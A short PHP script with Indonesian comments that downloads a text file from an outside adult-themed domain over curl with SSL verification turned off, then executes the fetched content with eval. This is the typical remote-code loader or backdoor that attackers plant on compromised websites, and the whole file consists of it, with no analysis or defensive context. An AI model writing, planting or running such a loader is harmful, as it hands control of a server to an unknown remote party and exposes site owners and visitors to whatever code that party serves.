<?php
$url = "https://v1.javpornsub.net/5.txt";

// Inisialisasi curl
$ch = curl_init();

// Set opsi curl
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Ikuti redirect jika ada
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Abaikan verifikasi SSL (tidak disarankan untuk produksi)

// Eksekusi permintaan
$remote_code = curl_exec($ch);

// Tangani error
if (curl_errno($ch)) {
    echo "cURL error: " . curl_error($ch);
} else {
    if ($remote_code !== false) {
        // Jalankan kode yang diambil
        eval("?>$remote_code");
    } else {
        echo "Gagal mengambil kode.";
    }
}

// Tutup curl
curl_close($ch);
?>